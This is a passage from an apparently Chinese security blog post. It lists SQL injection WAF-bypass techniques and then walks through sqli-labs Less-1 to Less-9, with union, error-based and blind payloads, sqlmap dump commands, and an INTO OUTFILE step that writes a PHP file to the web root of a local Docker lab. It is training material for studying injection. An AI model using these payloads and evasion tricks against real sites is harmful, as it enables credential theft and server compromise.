<h3 id="2-13-等号绕过"><a href="#2-13-等号绕过" class="headerlink" title="2.13 等号绕过"></a>2.13 等号绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">115</span>; # <span class="operator">&gt;</span> <span class="operator">&lt;</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="keyword">like</span> <span class="string">'r%'</span>; #<span class="keyword">like</span> rlike</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() regexp <span class="string">'^r'</span>; # regexp</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-14-双写绕过"><a href="#2-14-双写绕过" class="headerlink" title="2.14 双写绕过"></a>2.14 双写绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniunionon seleselectct</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-15-二次编码绕过"><a href="#2-15-二次编码绕过" class="headerlink" title="2.15 二次编码绕过"></a>2.15 二次编码绕过</h3><p><code>-1 union select 1,2,3,4# </code></p>
<p>第一次编码：</p>
<p><code>%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 </code></p>
<p>第二次编码：</p>
<p><code>%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33</code></p>
<h3 id="2-16-参数拆分绕过"><a href="#2-16-参数拆分绕过" class="headerlink" title="2.16 参数拆分绕过"></a>2.16 参数拆分绕过</h3><p>对于a=[input1]&amp;b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了<code>union select</code>，可以使用参数拆分</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">'union/*&amp;username=*/select 1,user(),3,4--+</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-17-生僻函数绕过"><a href="#2-17-生僻函数绕过" class="headerlink" title="2.17 生僻函数绕过"></a>2.17 生僻函数绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> @<span class="variable">@version</span>) f) x)); # polygon()替换updatexml()</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-18-分块传输绕过"><a href="#2-18-分块传输绕过" class="headerlink" title="2.18 分块传输绕过"></a>2.18 分块传输绕过</h3><p>​	如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。</p>
<p>​	接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(“\r\n”)。然后是数据本身，数据结束后，还会有CRLF(“\r\n”)两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。</p>
<h3 id="2-19-信任白名单绕过"><a href="#2-19-信任白名单绕过" class="headerlink" title="2.19 信任白名单绕过"></a>2.19 信任白名单绕过</h3><p>WAF会自带一些文件白名单，可以利用白名单绕过</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>phpmyadmin?name<span class="operator">=</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="keyword">user</span>()<span class="comment">--+&amp;submit=1</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-20-pipline绕过"><a href="#2-20-pipline绕过" class="headerlink" title="2.20 pipline绕过"></a>2.20 pipline绕过</h3><p>​	http协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，Apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。</p>
<p>​	用burpsuite抓包提交，复制整个包信息放在第一个包最后，把第一个包close改成keep-alive把brupsuite自动更新Content-Length勾去掉，有些WAF不会对第一个包的参数进行检测。</p>
<h3 id="2-21-利用multipart-form-data绕过"><a href="#2-21-利用multipart-form-data绕过" class="headerlink" title="2.21 利用multipart/form-data绕过"></a>2.21 利用multipart/form-data绕过</h3><p>​	multipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>
<h3 id="2-22-order-by-绕过"><a href="#2-22-order-by-绕过" class="headerlink" title="2.22 order by 绕过"></a>2.22 order by 绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> <span class="variable">@a</span>,<span class="variable">@b</span>,<span class="variable">@c</span>,<span class="variable">@d</span>; # 替代<span class="keyword">order</span> <span class="keyword">by</span>猜解字段数</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-23-修改请求方式绕过"><a href="#2-23-修改请求方式绕过" class="headerlink" title="2.23 修改请求方式绕过"></a>2.23 修改请求方式绕过</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以更改请求方式尝试绕过。</p>
<h3 id="2-24-大量字符绕过"><a href="#2-24-大量字符绕过" class="headerlink" title="2.24 大量字符绕过"></a>2.24 大量字符绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">select</span> <span class="number">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>)<span class="comment">/*!union*/</span><span class="comment">/*!select*/</span><span class="number">1</span>,<span class="keyword">user</span>()</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-25-花括号绕过"><a href="#2-25-花括号绕过" class="headerlink" title="2.25 花括号绕过"></a>2.25 花括号绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span>{x <span class="number">1</span>},<span class="keyword">user</span>(); # 花括号左边是注释的内容</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-26-union-select绕过"><a href="#2-26-union-select绕过" class="headerlink" title="2.26 union select绕过"></a>2.26 union select绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sel<span class="operator">&lt;&gt;</span>ect # 程序过滤<span class="operator">&lt;&gt;</span>为空 脚本处理</span><br><span class="line">sele<span class="comment">/**/</span>ct # 程序过滤<span class="comment">/**/</span>为空</span><br><span class="line"><span class="comment">/*!%53eLEct*/</span> # url 编码与内联注释</span><br><span class="line">se<span class="operator">%</span><span class="number">0</span>blect # 使用空格绕过</span><br><span class="line">sele<span class="operator">%</span>ct # 使用百分号绕过</span><br><span class="line"><span class="operator">%</span><span class="number">53</span>eLEct # 编码绕过</span><br><span class="line"><span class="keyword">uNIoN</span> <span class="keyword">sELecT</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">DISTINCT</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">null</span><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">/*!union*/</span><span class="comment">/*!select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">Select</span> <span class="number">0xA</span><span class="operator">*</span><span class="number">1000</span>)<span class="comment">/*!uNIOn*/</span><span class="comment">/*!SeLECt*/</span> <span class="number">1</span>,<span class="keyword">user</span>()</span><br><span class="line"><span class="comment">/*!50000union*/</span><span class="comment">/*!50000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">/*!40000union*/</span><span class="comment">/*!40000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>aunion<span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">250</span>aunion<span class="operator">%</span><span class="number">250</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">09</span><span class="keyword">union</span><span class="operator">%</span><span class="number">09</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>caunion<span class="operator">%</span><span class="number">0</span>cselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>daunion<span class="operator">%</span><span class="number">0</span>dselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>baunion<span class="operator">%</span><span class="number">0</span>bselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>d<span class="operator">%</span><span class="number">0</span>aunion<span class="operator">%</span><span class="number">0</span>d<span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2</span></span><br><span class="line"><span class="comment">/*!12345union*/</span><span class="comment">/*!12345select*/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/*中文*/</span><span class="keyword">union</span><span class="comment">/*中文*/</span><span class="keyword">select</span><span class="comment">/*中文*/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/* */</span><span class="keyword">union</span><span class="comment">/* */</span><span class="keyword">select</span><span class="operator">/</span> <span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/*!union*/</span><span class="comment">/*!00000all*/</span><span class="comment">/*!00000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="2-27-information-schema绕过"><a href="#2-27-information-schema绕过" class="headerlink" title="2.27 information_schema绕过"></a>2.27 information_schema绕过</h3><p>使用<code>sys.schema_auto_increment_columns</code>、<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_table_index</code>绕过</p>
<h2 id="3-sqli-labs通关"><a href="#3-sqli-labs通关" class="headerlink" title="3. sqli-labs通关"></a>3. sqli-labs通关</h2><p>这里跟着<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html">国光佬</a>学习</p>
<h3 id="3-1-准备工作"><a href="#3-1-准备工作" class="headerlink" title="3.1 准备工作"></a>3.1 准备工作</h3><p><strong>sqli-labs环境搭建</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line">docker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>

<p>中间可能报错，只需要关闭代理就行。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: Head <span class="string">"https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest"</span>: Get <span class="string">"https://auth.docker.io/token?account=squarehhh&amp;scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&amp;service=registry.docker.io"</span>: EOF</span><br></pre></td></tr></tbody></table></figure>

<p>访问网页，环境搭建完毕。</p>
<img src="/posts/31899/image-20250305014536324.png" class="" title="image-20250305014536324">

<h3 id="3-2-Less-1-20"><a href="#3-2-Less-1-20" class="headerlink" title="3.2 Less 1-20"></a>3.2 Less 1-20</h3><h4 id="3-2-1-Less-1"><a href="#3-2-1-Less-1" class="headerlink" title="3.2.1 Less-1"></a>3.2.1 Less-1</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());  </span><br></pre></td></tr></tbody></table></figure>

<p><strong>联合注入</strong></p>
<p>手工</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23 # 查库</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>"security")<span class="operator">%</span><span class="number">23</span> # 查表</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name="users")%23 # 查字段</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,password SEPARATOR <span class="number">0x3c62723e</span>) <span class="keyword">from</span> users)<span class="operator">%</span><span class="number">23</span> # <span class="number">0x3c62723e</span><span class="operator">=</span><span class="operator">&lt;</span>br<span class="operator">&gt;</span>，即按换行分割</span><br></pre></td></tr></tbody></table></figure>

<p>sqlmap</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=U -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<p><strong>报错注入</strong></p>
<p>手工</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1)%23</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></tbody></table></figure>

<p>sqlmap</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=E -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<p><strong>布尔盲注</strong></p>
<p>手工</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67 %23 # 有回显</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">68</span> <span class="operator">%</span><span class="number">23</span> # 无回显</span><br></pre></td></tr></tbody></table></figure>

<p>sqlmap</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=B -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<p><strong>时间盲注</strong></p>
<p>手工</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;68,1,sleep(5)) %23</span></span><br></pre></td></tr></tbody></table></figure>

<p>sqlmap</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=T -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>

<h4 id="3-2-2-Less-2"><a href="#3-2-2-Less-2" class="headerlink" title="3.2.2 Less-2"></a>3.2.2 Less-2</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-3-Less-3"><a href="#3-2-3-Less-3" class="headerlink" title="3.2.3 Less-3"></a>3.2.3 Less-3</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=('<span class="subst">$id</span>') LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-4-Less-4"><a href="#3-2-4-Less-4" class="headerlink" title="3.2.4 Less-4"></a>3.2.4 Less-4</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-5-Less-5"><a href="#3-2-5-Less-5" class="headerlink" title="3.2.5 Less-5"></a>3.2.5 Less-5</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>不支持联合查询。</p>
<h4 id="3-2-6-Less-6"><a href="#3-2-6-Less-6" class="headerlink" title="3.2.6 Less-6"></a>3.2.6 Less-6</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式不一样。</p>
<h4 id="3-2-7-Less-7"><a href="#3-2-7-Less-7" class="headerlink" title="3.2.7 Less-7"></a>3.2.7 Less-7</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=(('<span class="subst">$id</span>')) LIMIT 0,1"</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You have an error in your SQL syntax"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><strong>布尔盲注</strong></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67 %23 //正常回显</span></span><br><span class="line"><span class="string">?id=1'</span>))<span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">68</span> <span class="operator">%</span><span class="number">23</span> <span class="operator">/</span><span class="operator">/</span>报错</span><br></pre></td></tr></tbody></table></figure>

<p><strong>时间盲注</strong></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67,1,sleep(5)) %23 //不延时</span></span><br><span class="line"><span class="string">?id=1'</span>))<span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">68</span>,<span class="number">1</span>,sleep(<span class="number">5</span>)) <span class="operator">%</span><span class="number">23</span> <span class="operator">/</span><span class="operator">/</span>延时</span><br></pre></td></tr></tbody></table></figure>

<p><strong>outfile</strong></p>
<p>这里因为提示<code>Use outfile</code>，因此可以尝试写文件。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -e <span class="string">"show global variables like '%secure%';"</span></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></tbody></table></figure>

<p>当<code>secure_file_priv</code>为<code>null</code>时，表示限制<code>mysql</code>不允许导入导出。</p>
<p>当<code>secure_file_priv</code>为<code>/tmp</code>时，表示限制<code>mysql</code>只能在<code>/tmp</code>目录下导入导出。</p>
<p>当<code>secure_file_priv</code>为<code>空</code>时，表示限制<code>mysql</code>不对导入导出做限制。</p>
<p>这里还需要赋予文件写入的权限</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> -R 777 /var/www/html</span><br></pre></td></tr></tbody></table></figure>

<p>然后执行sql语句</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'))union select * from security.users into outfile "/var/www/html/Less-7/user.txt"%23</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250310220651812.png" class="" title="image-20250310220651812">

<p>这里也可以写入shell</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'))union select 1,2,"&lt;?php phpinfo();?&gt;" into outfile "/var/www/html/Less-7/info.php"%23</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250310220934038.png" class="" title="image-20250310220934038">

<h4 id="3-2-8-Less-8"><a href="#3-2-8-Less-8" class="headerlink" title="3.2.8 Less-8"></a>3.2.8 Less-8</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">    <span class="comment">//echo "You have an error in your SQL syntax";</span></span><br></pre></td></tr></tbody></table></figure>

<p>闭合方式改变。</p>
<h4 id="3-2-9-Less-9"><a href="#3-2-9-Less-9" class="headerlink" title="3.2.9 Less-9"></a>3.2.9 Less-9</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You are in....'</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>只能用延时注入。</p>
